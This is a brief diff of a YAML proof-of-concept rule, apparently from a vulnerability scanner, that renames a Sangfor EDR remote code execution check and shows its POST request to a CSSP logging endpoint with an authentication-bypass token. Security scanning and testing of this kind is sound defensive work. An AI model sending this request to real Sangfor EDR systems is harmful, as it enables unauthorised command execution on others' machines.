@@ -1,4 +1,4 @@
-name: poc-yaml-sangfor-edr-unauthorized-rce
+name: poc-yaml-sangfor-edr-cssp-rce
 rules:
   - method: POST
     path: /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9
